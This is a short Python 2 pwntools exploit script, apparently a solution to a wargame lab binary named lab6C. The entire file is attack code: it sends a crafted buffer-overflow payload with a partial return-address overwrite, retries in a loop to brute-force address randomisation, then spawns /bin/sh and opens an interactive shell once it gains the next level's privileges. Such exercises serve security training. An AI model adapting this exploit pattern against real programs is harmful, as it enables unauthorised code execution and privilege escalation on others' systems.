#! /usr/bin/python2
import pwn
while True:
        p = pwn.process("/levels/lab06/lab6C")
        p.recv(200) 
        p.sendline(" "*40+"\xc6"+" "*282+"\x2b\x77")
        p.recv(200) 
        p.sendline("/bin/sh")
        p.sendline("id")
        try:
                ret = p.recv(2000)
        except:  
                continue
        else:    
                print(ret)
                if ("lab6B" in ret):
                    p.interactive()
                    exit()
